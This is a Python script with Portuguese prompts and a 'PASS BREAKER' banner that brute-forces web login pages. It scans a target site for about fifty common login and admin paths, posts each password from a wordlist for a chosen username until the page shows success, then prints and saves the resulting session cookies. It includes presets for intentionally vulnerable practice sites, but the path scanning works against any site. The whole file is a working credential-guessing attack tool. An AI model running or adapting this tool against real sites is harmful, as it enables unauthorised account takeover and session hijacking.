import requests
import os
import sys
from urllib.parse import urljoin
from colorama import init, Fore, Style

# Inicializa o colorama
init(autoreset=True)

# Banner
print(Fore.LIGHTCYAN_EX + Style.BRIGHT + """

██████╗  █████╗ ███████╗███████╗    ██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║███████╗███████╗    ██████╔╝██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝
██╔═══╝ ██╔══██║╚════██║╚════██║    ██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██║     ██║  ██║███████║███████║    ██████╔╝██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                         
""")

# Lista arquivos .txt
def listar_txt_na_pasta():
    pasta_atual = os.getcwd()
    txt_files = [f for f in os.listdir(pasta_atual) if f.endswith('.txt')]
    if not txt_files:
        print(Fore.LIGHTRED_EX + "\nNenhum arquivo .txt encontrado na pasta.")
        sys.exit()
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Escolha um arquivo de wordlist\n")
    for idx, file in enumerate(txt_files, start=1):
        print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + f"{idx} = {file}")
    while True:
        try:
            choice = int(input(Fore.LIGHTCYAN_EX + Style.BRIGHT + "\nDigite o número do arquivo wordlist: "))
            if 1 <= choice <= len(txt_files):
                return os.path.join(pasta_atual, txt_files[choice - 1])
            else:
                print(Fore.LIGHTRED_EX + "Opção inválida. Tente novamente.")
        except ValueError:
            print(Fore.LIGHTRED_EX + "Por favor, insira um número válido.")

# Entrada base
base_url = input(Fore.LIGHTGREEN_EX + Style.BRIGHT + "Digite a URL do website (Ex: http://testphp.vulnweb.com): ").strip().rstrip("/")
username = input(Fore.LIGHTGREEN_EX + Style.BRIGHT + "\nDigite o username: ").strip()

# Detectar login_url
def detectar_login_url(base):
    caminhos_especiais = {
        "vulnweb.com": ("/userinfo.php", lambda u, p: {'uname': u, 'pass': p, 'submit': 'Login'}),
        "testsparker.com": ("/auth/login.php", lambda u, p: {'username': u, 'password': p, 'Login': 'Login'}),
        "altoro.testfire.net": ("/login.jsp", lambda u, p: {'j_username': u, 'j_password': p, 'submit': 'Login'}),
        "dvwa": ("/login.php", lambda u, p: {'username': u, 'password': p, 'login-php-submit-button': 'Login'}),
    }

    # Se a URL já contém um caminho de login, usa diretamente
    if any(p in base.lower() for p in ["/login", ".php", ".jsp", ".aspx"]):
        print(Fore.LIGHTBLUE_EX + f"\n[✓] URL de login informada diretamente: {base}")
        for dominio, (_, template) in caminhos_especiais.items():
            if dominio in base:
                return base, template
        # Se não for domínio especial, usa template genérico
        return base, lambda u, p: {'username': u, 'password': p}

    # Caso contrário, tenta detectar automaticamente
    for dominio, (path, template) in caminhos_especiais.items():
        if dominio in base:
            return urljoin(base, path), template

    common_paths = [
        "/wp-login.php", "/login", "/admin", "/user/login", "/login.php", "/account/login", "/signin", "/logon",
        "/users/login", "/dashboard/login", "/login/index.php", "/auth", "/admin/login", "/cpanel", "/login.html",
        "/member/login", "/login.jsp", "/login.aspx", "/client/login", "/secure/login", "/system/login",
        "/access/login", "/auth/login", "/portal/login", "/panel/login", "/web/login", "/staff/login",
        "/employee/login", "/adminarea/login", "/backend/login", "/log-in", "/member-area/login", "/signin.php",
        "/usuarios/login", "/connexion", "/acceder", "/accounts/login", "/session/login", "/user/auth",
        "/auth/signin", "/admincp/login", "/usuarios/acesso", "/backend/auth", "/app/login", "/admin/index.php",
        "/login_admin", "/moderator/login", "/adminpanel", "/adminarea", "/cms/login", "dvwa/login.php", "dvwa", "login.php",
        "/dvwa/security.php", "security.php", "/auth/login.php",
    ]

    headers = {'User-Agent': 'Mozilla/5.0'}
    for path in common_paths:
        test_url = urljoin(base, path)
        try:
            resp = requests.get(test_url, headers=headers, timeout=5)
            if resp.status_code == 200 and any(w in resp.text.lower() for w in ['login', 'username', 'password']):
                print(Fore.LIGHTBLUE_EX + f"\n[✓] Caminho de login detectado: {test_url}")
                return test_url, lambda u, p: {
                    'log': u, 'pwd': p,
                    'wp-submit': 'Log+In',
                    'redirect_to': urljoin(base, "/wp-admin/"),
                    'testcookie': '1'
                }
        except requests.RequestException:
            continue

    print(Fore.LIGHTRED_EX + "\n[!] Nenhum endpoint de login encontrado automaticamente.")
    sys.exit()

# Detectar login
login_url, login_data_template = detectar_login_url(base_url)
print(Fore.LIGHTCYAN_EX + f"\nURL de login usada: {login_url}\n")

# Escolher wordlist
wordlist_path = listar_txt_na_pasta()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
}

with requests.Session() as session:
    if os.path.exists(wordlist_path):
        try:
            try:
                with open(wordlist_path, 'r', encoding='utf-8') as wordlist:
                    passwords = wordlist.read().splitlines()
            except UnicodeDecodeError:
                with open(wordlist_path, 'r', encoding='latin-1') as wordlist:
                    passwords = wordlist.read().splitlines()

            print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + f"\nTotal de senhas na wordlist: {len(passwords)}\n")

            for i, password in enumerate(passwords, 1):
                password = password.strip()
                login_data = login_data_template(username, password)
                response = session.post(login_url, data=login_data, headers=headers, allow_redirects=True)

                if any(palavra in response.text for palavra in ["Logout", "Welcome", "Dashboard"]):
                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[{i:<3}]  Usuário: {username:<10} | Senha: {password}  [✓] Login bem-sucedido!")
                    break
                else:
                    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + f"[{i:<3}]  Usuário: {username:<10} | Senha: {password}")
            else:
                print(Fore.LIGHTRED_EX + "\n[-] Nenhuma senha funcionou com esse usuário.")
        except Exception as e:
            print(Fore.LIGHTRED_EX + f"\n[!] Erro ao processar wordlist: {e}")
    else:
        print(Fore.LIGHTRED_EX + "\nErro: Arquivo de wordlist não encontrado!")

# Mostrar e salvar cookies
print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "\nCookies da sessão")
for cookie in session.cookies:
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + f"\n{cookie.name}={cookie.value}")

salvar = input(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "\nDeseja salvar os cookies? (s/n): ").strip().lower()
if salvar == 's':
    with open('cookies.txt', 'w') as cookie_file:
        for cookie in session.cookies:
            cookie_file.write(f"{cookie.name}={cookie.value}\n")
    print(Fore.LIGHTGREEN_EX + "\nCookies salvos em: cookies.txt")
else:
    print(Fore.LIGHTRED_EX + "\nCookies não foram salvos.")

input(Fore.LIGHTRED_EX + "\n\n========== PRESSIONE ENTER PARA SAIR ==========\n")
